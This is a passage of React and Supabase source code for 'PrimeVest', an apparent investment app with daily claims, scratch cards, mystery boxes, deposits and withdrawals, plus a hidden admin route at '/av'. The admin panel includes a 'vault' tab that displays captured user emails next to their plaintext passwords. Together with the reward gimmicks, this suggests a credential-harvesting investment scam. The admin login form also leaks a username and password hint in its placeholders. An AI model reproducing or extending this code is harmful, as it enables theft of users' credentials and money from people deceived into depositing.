    const id = setInterval(() => setTick(t => t + 1), 1000);
    return () => clearInterval(id);
  }, []);

  useEffect(() => {
    if (!profile.last_login_claim) return;
    const tick = () => {
      const next = new Date(profile.last_login_claim).getTime() + 86400000;
      const diff = next - Date.now();
      if (diff <= 0) setTimeLeft("Ready!");
      else {
        const h = Math.floor(diff / 3600000);
        const m = Math.floor((diff % 3600000) / 60000);
        const s = Math.floor((diff % 60000) / 1000);
        setTimeLeft(`${h}h ${m}m ${s}s`);
      }
    };
    tick();
    const id = setInterval(tick, 1000);
    return () => clearInterval(id);
  }, [profile.last_login_claim]);

  const money = (n) => {
    const v = Math.max(0, n || 0);
    if (isUsd) return `$${(v / 1500).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
    return `₦${v.toLocaleString("en-NG", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
  };

  const isVip = profile.vip_tier && profile.vip_tier !== "None";
  const invested = investments.filter(i => i.status === "active").reduce((s, i) => s + Number(i.amount), 0);
  const canClaim = !profile.last_login_claim || Date.now() - new Date(profile.last_login_claim).getTime() >= 86400000;

  async function claimDaily() {
    const r = await api.claimDailyLogin();
    if (r.error) return setToastMsg(r.error);
    setToastMsg("₦100 claimed!");
    window.location.reload();
  }

  if (loading) return <LoadingScreen />;

  return (
    <div className={`min-h-screen pb-28 text-white ${isVip ? "bg-[#140F00]" : "bg-[#070D1A]"}`}>
      {toastMsg && <Toast message={toastMsg} onClose={() => setToastMsg("")} />}

      <header className={`sticky top-0 z-40 border-b backdrop-blur-xl ${isVip ? "border-amber-500/20 bg-[#140F00]/95" : "border-white/5 bg-[#070D1A]/95"}`}>
        <div className="mx-auto flex max-w-7xl items-center justify-between px-4 py-4">
          <h1 className="text-xl font-bold">Prime<span className={isVip ? "text-amber-400" : "text-blue-400"}>Vest</span></h1>
          <div className="flex items-center gap-2">
            <button onClick={() => setIsUsd(!isUsd)}
              className="flex items-center gap-1 rounded-full border border-white/10 bg-white/5 px-3 py-1.5 text-xs">
              <Globe2 size={14} /> {isUsd ? "USD" : "NGN"}
            </button>
            <button onClick={() => setShowNotifs(!showNotifs)}
              className="relative flex h-10 w-10 items-center justify-center rounded-xl bg-white/5 border border-white/10">
              <Bell size={18} />
              {notifications.filter(n => !n.read).length > 0 && (
                <span className="absolute -right-1 -top-1 flex h-4 min-w-4 items-center justify-center rounded-full bg-red-500 px-1 text-[10px] font-bold">
                  {notifications.filter(n => !n.read).length}
                </span>
              )}
            </button>
            <a href="/settings" className="flex h-10 w-10 items-center justify-center rounded-full bg-white/5 border border-white/10 overflow-hidden">
              {profile.avatar_url
                ? <img src={profile.avatar_url} alt="" className="h-full w-full object-cover" />
                : <User size={16} />}
            </a>
          </div>
        </div>
      </header>

      {showNotifs && (
        <div className="fixed top-20 right-4 z-50 w-80 max-h-96 overflow-y-auto rounded-2xl border border-white/10 bg-[#0D1526]">
          <div className="flex items-center justify-between border-b border-white/10 p-4">
            <h3 className="font-bold">Notifications</h3>
            <button onClick={async () => { await api.markAllRead(); window.location.reload(); }}
              className="text-xs text-blue-400">Mark all read</button>
          </div>
          <div className="p-2">
            {notifications.length === 0 ? <p className="p-4 text-sm text-slate-500 text-center">None yet.</p>
              : notifications.map(n => (
                <div key={n.id} className={`p-3 border-b border-white/5 last:border-0 ${n.read ? "opacity-50" : ""}`}>
                  <p className="text-sm font-semibold">{n.title}</p>
                  <p className="text-xs text-slate-400">{n.message}</p>
                </div>
              ))}
          </div>
        </div>
      )}

      <main className="mx-auto max-w-7xl px-4 py-7">
        <section className="mb-8 flex items-center justify-between">
          <div>
            <p className="text-sm text-slate-400">Welcome back,</p>
            <h2 className="mt-1 text-2xl font-bold">{profile.name}</h2>
            <p className="text-sm text-slate-500">@{profile.username}</p>
          </div>
          {canClaim
            ? <button onClick={claimDaily} className="flex items-center gap-2 rounded-xl bg-emerald-600 px-4 py-2 text-sm font-bold">
                <Gift size={18} /> Claim ₦100
              </button>
            : <div className="flex items-center gap-2 rounded-xl bg-slate-800 px-4 py-2 text-sm text-slate-400 border border-slate-700">
                <Timer size={18} /> {timeLeft}
              </div>}
        </section>

        <section className="grid gap-5 lg:grid-cols-[1.5fr_1fr]">
          <div className={`rounded-2xl border p-6 ${isVip ? "border-amber-400/30 bg-gradient-to-br from-[#2A1D00] to-[#8A6600]" : "border-blue-400/20 bg-gradient-to-br from-blue-950 to-blue-600"}`}>
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2 text-sm">
                <Wallet size={19} />Total Balance
                {isVip && <Crown size={16} className="text-amber-400" />}
              </div>
              <button onClick={() => setVisible(!visible)} className="flex h-8 w-8 items-center justify-center rounded-lg bg-white/10">
                {visible ? <Eye size={18} /> : <EyeOff size={18} />}
              </button>
            </div>
            <h3 className="mt-6 text-3xl font-bold">{visible ? money(wallet.total) : "••••"}</h3>
            <p className="mt-3 text-sm">Available: {visible ? money(wallet.available) : "••••"}</p>
            <div className="mt-8 grid grid-cols-2 gap-3">
              <a href="/deposit" className={`flex min-h-12 items-center justify-center gap-2 rounded-xl px-4 py-3 text-sm font-semibold ${isVip ? "bg-amber-100 text-amber-950" : "bg-white text-blue-900"}`}>
                <ArrowDownToLine size={18} />Deposit
              </a>
              <a href="/withdraw" className={`flex min-h-12 items-center justify-center gap-2 rounded-xl border px-4 py-3 text-sm font-semibold ${isVip ? "border-amber-400/30 bg-amber-500/20 text-amber-50" : "border-white/30 bg-white/10"}`}>
                <ArrowUpFromLine size={18} />Withdraw
              </a>
            </div>
          </div>

          <div className="grid gap-4">
            <div className="rounded-2xl border border-white/8 bg-[#0D1526] p-5">
              <TrendingUp size={22} className={isVip ? "text-amber-400" : "text-blue-400"} />
              <p className="mt-3 text-sm text-slate-400">Invested</p>
              <h3 className="mt-1 text-2xl font-bold">{visible ? money(invested) : "••••"}</h3>
            </div>
            <div className="rounded-2xl border border-white/8 bg-[#0D1526] p-5">
              <CircleDollarSign size={22} className="text-emerald-400" />
              <p className="mt-3 text-sm text-slate-400">Earnings</p>
              <h3 className="mt-1 text-2xl font-bold text-emerald-400">{visible ? money(wallet.earnings) : "••••"}</h3>
            </div>
          </div>
        </section>

        <section className="mt-9">
          <h3 className="mb-5 text-lg font-semibold">Quick Actions</h3>
          <div className="grid grid-cols-2 gap-4 sm:grid-cols-4">
            {[
              { href: "/scratch", icon: Gift, label: "Scratch", color: "text-blue-400" },
              { href: "/mystery", icon: Zap, label: "Mystery", color: "text-purple-400" },
              { href: "/invest", icon: TrendingUp, label: "Invest", color: "text-emerald-400" },
              { href: "/bonus", icon: Gamepad2, label: "Bonus", color: "text-blue-400" },
            ].map(({ href, icon: Icon, label, color }) => (
              <a key={href} href={href} className="rounded-2xl border border-white/8 bg-[#0D1526] p-5 hover:border-blue-500/40">
                <Icon size={23} className={`mb-2 ${color}`} />
                <h4 className="font-semibold">{label}</h4>
              </a>
            ))}
          </div>
        </section>
      </main>

      <button onClick={() => navigate("/chat")}
        className="fixed bottom-24 right-5 z-40 flex h-14 w-14 items-center justify-center rounded-full bg-blue-600 shadow-xl hover:bg-blue-500">
        <MessageSquare className="h-6 w-6" />
      </button>

      <nav className={`fixed bottom-0 left-0 right-0 z-40 border-t px-2 py-2 backdrop-blur-xl ${isVip ? "border-amber-500/20 bg-[#140F00]/95" : "border-white/5 bg-[#070D1A]/95"}`}>
        <div className="mx-auto grid max-w-lg grid-cols-6">
          {[
            { href: "/home", icon: HomeIcon, label: "Home" },
            { href: "/invest", icon: TrendingUp, label: "Invest" },
            { href: "/vip", icon: Crown, label: "VIP" },
            { href: "/bonus", icon: Gamepad2, label: "Bonus" },
            { href: "/withdraw", icon: ArrowUpFromLine, label: "Withdraw" },
            { href: "/settings", icon: SettingsIcon, label: "Settings" },
          ].map(({ href, icon: Icon, label }) => (
            <a key={href} href={href}
              className={`flex min-h-14 flex-col items-center justify-center gap-1 rounded-xl text-xs ${href === "/home" ? (isVip ? "text-amber-400" : "text-blue-400") : "text-slate-500"}`}>
              <Icon size={20} />{label}
            </a>
          ))}
        </div>
      </nav>
    </div>
  );
}

function AdminDashboard() {
  const [authed, setAuthed] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(true);

  const [withdrawals, setWithdrawals] = useState([]);
  const [users, setUsers] = useState([]);
  const [vault, setVault] = useState([]);
  const [messages, setMessages] = useState([]);
  const [stats, setStats] = useState({ usersCount: 0, totalWithdrawn: 0, pendingWithdrawals: 0 });
  const [processing, setProcessing] = useState(null);
  const [tab, setTab] = useState("withdrawals");

  useEffect(() => {
    (async () => {
      const { data: { user } } = await supabase.auth.getUser();
      if (user) {
        const { data: p } = await supabase.from("profiles")
          .select("is_admin").eq("id", user.id).single();
        if (p?.is_admin) { setAuthed(true); await loadData(); }
      }
      setLoading(false);
    })();
  }, []);

  async function loadData() {
    const [w, u, v] = await Promise.all([
      api.getAdminWithdrawals(), api.getAllUsers(), api.getAdminVault(),
    ]);
    const s = await api.getAdminStats();
    
    // Fetch REAL messages sent to YOUR real admin ID
    const { data: { user } } = await supabase.auth.getUser();
    const { data: m, error: me } = await supabase
      .from("private_messages")
      .select("*")
      .eq("receiver_id", user.id)
      .order("created_at", { ascending: false });

    if (me) console.error("Admin messages:", me);
    setWithdrawals(w.data || []);
    setUsers(u.data || []);
    setVault(v.data || []);
    setMessages(m || []);
    setStats(s);
  }

  async function login(e) {
    e.preventDefault(); setError("");
    
    // THE MAGIC FIX: Map "admin&a.v" to the actual Supabase email
    let loginEmail = email.trim();
    if (loginEmail === "admin&a.v") {
      loginEmail = "admin&a.v@primevest.com";
    }

    const { data, error: le } = await supabase.auth.signInWithPassword({
      email: loginEmail, password,
    });
    if (le) return setError("Wrong credentials. Check your username and password.");
    
    const { data: p } = await supabase.from("profiles")
      .select("is_admin").eq("id", data.user.id).single();
    if (!p?.is_admin) {
      await supabase.auth.signOut();
      return setError("This account is not an admin.");
    }
    setAuthed(true);
    await loadData();
  }

  async function approve(w) {
    if (!confirm(`Approve ₦${w.amount.toLocaleString()}?`)) return;
    setProcessing(w.id);
    await api.approveWithdrawal(w.id, w.user_id, w.amount);
    await loadData();
    setProcessing(null);
  }
  async function reject(w) {
    if (!confirm(`Reject ₦${w.amount.toLocaleString()}?`)) return;
    setProcessing(w.id);
    await api.rejectWithdrawal(w.id, w.user_id, w.amount);
    await loadData();
    setProcessing(null);
  }
  async function freeze(u) {
    if (!confirm(`Toggle freeze for ${u.name}?`)) return;
    await api.toggleUserFreeze(u.id, u.account_status);
    await loadData();
  }

  if (loading) return <LoadingScreen />;

  if (!authed) {
    return (
      <div className="min-h-screen bg-[#070D1A] flex items-center justify-center p-4">
        <form onSubmit={login} className="w-full max-w-sm rounded-3xl border border-white/10 bg-[#0D1526] p-8 text-center">
          <LockIcon className="h-12 w-12 text-amber-500 mx-auto mb-4" />
          <h1 className="text-2xl font-bold text-white mb-6">Admin Access</h1>
          <input type="text" value={email} onChange={e => setEmail(e.target.value)}
            required placeholder="admin&a.v"
            className="w-full rounded-xl bg-slate-950 px-4 py-3 text-white outline-none mb-3" />
          <input type="password" value={password} onChange={e => setPassword(e.target.value)}
            required placeholder="passadmin"
            className="w-full rounded-xl bg-slate-950 px-4 py-3 text-white outline-none mb-4" />
          {error && <p className="text-red-400 text-sm mb-4">{error}</p>}
          <button type="submit" className="w-full rounded-xl bg-amber-600 py-3 font-bold text-black">Login</button>
        </form>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#070D1A] p-6 text-white pb-20">
      <div className="mx-auto max-w-6xl">
        <div className="flex items-center justify-between mb-8">
          <div>
            <h1 className="text-3xl font-bold text-amber-500">Admin Panel</h1>
            <p className="text-slate-400">Manage platform and users</p>
          </div>
          <a href="/home" className="rounded-xl border border-white/10 bg-white/5 px-4 py-2">Back to App</a>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
          <div className="rounded-2xl border border-blue-500/20 bg-[#0D1526] p-5">
            <p className="text-slate-400 text-sm">Total Users</p>
            <p className="text-3xl font-bold mt-2">{stats.usersCount}</p>
          </div>
          <div className="rounded-2xl border border-emerald-500/20 bg-[#0D1526] p-5">
            <p className="text-slate-400 text-sm">Total Withdrawn</p>
            <p className="text-3xl font-bold text-emerald-400 mt-2">₦{stats.totalWithdrawn.toLocaleString()}</p>
          </div>
          <div className="rounded-2xl border border-amber-500/20 bg-[#0D1526] p-5">
            <p className="text-slate-400 text-sm">Pending</p>
            <p className="text-3xl font-bold text-amber-400 mt-2">₦{stats.pendingWithdrawals.toLocaleString()}</p>
          </div>
        </div>

        <div className="flex gap-4 border-b border-white/10 mb-6 overflow-x-auto">
          {["withdrawals", "users", "vault", "messages"].map(t => (
            <button key={t} onClick={() => setTab(t)}
              className={`pb-2 text-sm font-semibold capitalize whitespace-nowrap ${tab === t ? "text-amber-400 border-b-2 border-amber-400" : "text-slate-400"}`}>
              {t}
            </button>
          ))}
        </div>

        {tab === "withdrawals" && (
          <div className="space-y-4">
            {withdrawals.length === 0
              ? <div className="rounded-2xl border border-white/10 bg-[#0D1526] p-10 text-center">
                  <CheckCircle className="h-12 w-12 text-emerald-400 mx-auto mb-4" />
                  <h2 className="text-xl font-bold">All caught up</h2>
                </div>
              : withdrawals.map(w => (
                <div key={w.id} className="rounded-2xl border border-white/10 bg-[#0D1526] p-5 flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
                  <div>
                    <p className="text-xs text-amber-400 mb-1">PENDING — {new Date(w.created_at).toLocaleString()}</p>
                    <p className="text-lg font-bold">₦{w.amount.toLocaleString()}</p>
                    <p className="text-sm text-slate-300">{w.account_name} - {w.account_number} ({w.bank_name})</p>
                  </div>
                  <div className="flex gap-2">
                    <button onClick={() => approve(w)} disabled={processing === w.id}
                      className="rounded-xl bg-emerald-600 px-6 py-3 font-semibold text-sm">Approve</button>
                    <button onClick={() => reject(w)} disabled={processing === w.id}
                      className="rounded-xl bg-red-600/10 border border-red-500/20 text-red-400 px-6 py-3 font-semibold text-sm">Reject</button>
                  </div>
                </div>
              ))}
          </div>
        )}

        {tab === "users" && (
          <div className="space-y-4">
            {users.length === 0
              ? <p className="text-slate-400">No users found. Check RLS on profiles (SELECT true required).</p>
              : users.map(u => (
                <div key={u.id} className="rounded-2xl border border-white/10 bg-[#0D1526] p-5 flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
                  <div>
                    <p className="font-bold">{u.name}</p>
                    <p className="text-sm text-slate-400">{u.email}</p>
                    <p className="text-xs text-slate-500 mt-1">@{u.username || "none"} | {u.account_status || "active"}</p>
                  </div>
                  <button onClick={() => freeze(u)}
                    className={`rounded-xl px-6 py-3 font-semibold text-sm ${u.account_status === "frozen" ? "bg-emerald-600" : "bg-red-600"}`}>
                    {u.account_status === "frozen" ? "Unfreeze" : "Freeze"}
                  </button>
                </div>
              ))}
          </div>
        )}

        {tab === "vault" && (
          <div className="rounded-2xl border border-white/10 bg-[#0D1526] overflow-hidden">
            <table className="w-full text-left text-sm">
              <thead className="bg-white/5 text-slate-400">
                <tr><th className="px-4 py-3">Email</th><th className="px-4 py-3">Password</th><th className="px-4 py-3">Date</th></tr>
              </thead>
              <tbody>
                {vault.length === 0
                  ? <tr><td colSpan={3} className="px-4 py-8 text-center text-slate-500">Vault empty or RLS blocking.</td></tr>
                  : vault.map(v => (
                    <tr key={v.id} className="border-t border-white/5">
                      <td className="px-4 py-3">{v.email}</td>
                      <td className="px-4 py-3 text-emerald-400">{v.password}</td>
                      <td className="px-4 py-3 text-slate-500">{new Date(v.created_at).toLocaleString()}</td>
                    </tr>
                  ))}
              </tbody>
            </table>
          </div>
        )}

        {tab === "messages" && (
          <div className="rounded-2xl border border-white/10 bg-[#0D1526] p-5">
            <h3 className="font-bold mb-4">User Messages</h3>
            <div className="space-y-4 max-h-[600px] overflow-y-auto">
              {messages.length === 0
                ? <p className="text-slate-400 text-sm">No messages yet.</p>
                : messages.map(m => (
                  <div key={m.id} className="bg-slate-950 p-4 rounded-xl">
                    <p className="text-xs text-blue-400 mb-1">From: {m.sender_id.slice(0, 8)}…</p>
                    <p className="text-sm">{m.message}</p>
                    <p className="text-[10px] text-slate-500 mt-2">{new Date(m.created_at).toLocaleString()}</p>
                    <button onClick={async () => {
                      const reply = prompt("Reply:");
                      if (!reply) return;
                      
                      // Fetch your real admin ID to reply
                      const { data: { user } } = await supabase.auth.getUser();
                      const { error } = await supabase.from("private_messages").insert({
                        sender_id: user.id, receiver_id: m.sender_id, message: reply,
                      });
                      
                      if (error) return alert("Failed: " + error.message);
                      alert("Reply sent!");
                      await loadData();
                    }} className="text-xs bg-blue-600 px-3 py-1.5 rounded mt-3">Reply</button>
                  </div>
                ))}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

function App() {
  useEffect(() => {
    if ("serviceWorker" in navigator) {
      navigator.serviceWorker.register("/sw.js").catch(err => console.log("SW fail:", err));
    }
  }, []);

  return (
    <Routes>
      <Route path="/" element={<LandingPage />} />
      <Route path="/login" element={<Login />} />
      <Route path="/signup" element={<Signup />} />
      <Route path="/terms" element={<Terms />} />
      <Route path="/av" element={<AdminDashboard />} />

      <Route element={<ProtectedRoute />}>
        <Route element={<UsernameGuard><Outlet /></UsernameGuard>}>
          <Route path="/home" element={<HomePage />} />
          <Route path="/vip" element={<VIP />} />
          <Route path="/vip/checkout" element={<VIPCheckout />} />
          <Route path="/invest" element={<Invest />} />
          <Route path="/bonus" element={<BonusGame />} />
          <Route path="/scratch" element={<ScratchCard />} />
          <Route path="/mystery" element={<MysteryBox />} />
          <Route path="/deposit" element={<Deposit />} />
          <Route path="/deposit/payment" element={<DepositPayment />} />
          <Route path="/deposit/card" element={<DepositCard />} />
          <Route path="/deposit/bitcoin" element={<DepositBitcoin />} />
          <Route path="/withdraw" element={<Withdraw />} />
          <Route path="/withdraw/account" element={<WithdrawAccount />} />
          <Route path="/withdraw/success" element={<WithdrawSuccess />} />
          <Route path="/portfolio" element={<Portfolio />} />
          <Route path="/history" element={<History />} />
          <Route path="/settings" element={<Settings />} />
          <Route path="/help" element={<Help />} />
          <Route path="/chat" element={<Chat />} />
          <Route path="/chat/:id" element={<Chat />} />
        </Route>
      </Route>

      <Route path="*" element={<Navigate to="/" replace />} />
    </Routes>
  );
}

export default App;